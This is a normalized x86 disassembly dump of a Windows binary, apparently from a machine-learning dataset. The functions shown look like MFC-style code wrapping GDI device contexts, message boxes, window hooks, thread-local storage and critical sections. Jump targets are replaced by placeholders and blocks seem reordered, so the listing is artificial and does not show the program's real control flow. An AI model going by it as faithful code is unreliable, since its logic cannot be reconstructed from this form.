jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_413462
pop ebx
sub_416735
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4166ae
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_412872
sub_416766
mov eax sub_4182e8
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_416735
push eax
call [ DeleteDC@IAT ]
sub_4167ba
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_4167eb
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_416829
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_416b99
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_416865
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_416b99
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_4168ab
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_4168da
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_416909
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_416937
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_416983
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4169cf
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_416a1b
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_416a73
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_416abf
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_416b27
mov eax sub_4182fe
call sub_4072e4
push esi
call sub_417335
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_41662c
call sub_413462
push 0x48
mov ebx eax
call sub_413474
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_415fd5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_413462
pop ebx
sub_416bae
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_416b27
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_412872
sub_416bee
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0xc ]
call sub_41352c
test eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_416c28
sub_416c28
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi esi
cmp [ esi ] bl
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
call sub_412ea3
mov edi eax
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
sub edi [ ebx ]
mov ecx ebx
push edi
call sub_412ef2
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov cl [ esi ]
cmp cl 0x25
jne r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x30
jl r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x30
jl r-xdata
inc edi
inc ebx
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov [ edi ] cl
inc edi
inc esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp [ esi ] 0x0
je r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc ebx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add ebx eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
push eax
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
add edi eax
jmp r-xdata
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc esi
inc esi
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_416d3e
push esi
call sub_405e84
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_416d6c
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_416d3e
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_416ee4
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_416d3e
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_416e53
push ebp
mov ebp esp
call sub_41730f
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416d6c
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_416e8b
mov eax sub_418270
call sub_4072e4
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_4134a8
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_416e53
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_412e25
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_416ee4
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_416f80
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_405e84
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_416fa2
mov eax sub_41808d
call sub_4072e4
push ecx
push 0x118
call sub_41760b
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_417037
sub_416fd6
mov eax sub_4180a1
call sub_4072e4
push ecx
push 0x3c
call sub_41760b
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_417206
sub_417069
mov eax sub_4180b4
call sub_4072e4
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_406c50
pop ecx
sub_417113
mov eax ecx
xor edx edx
lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_417191
mov eax sub_4180d6
call sub_4072e4
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_41796b
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_417240
mov eax sub_4180e8
call sub_4072e4
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_412657
push eax
call sub_41349d
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_41734c
push esi
push 0x1074
call sub_41760b
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_417113
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_417404
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_406580
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_4174e4
mov eax sub_4181b5
call sub_4072e4
push ecx
push 0x3c
call sub_413474
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_413bb8
sub_41751c
mov eax sub_4181ca
call sub_4072e4
push ecx
push esi
mov ecx rw-data
call sub_405dc9
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_413bb8
mov [ esi ] r--data
mov eax esi
sub_4175c7
mov eax sub_4181dd
call sub_4072e4
push ecx
push 0x10
call sub_41760b
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_417c84
sub_41763d
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_4125cf
sub_41767f
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_406580
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_4125cf
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_417791
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4177ee
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_41760b
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_4175f8
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_406580
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_4125cf
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_4178f4
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_41767f
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_4177ee
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_41763d
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_41796b
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
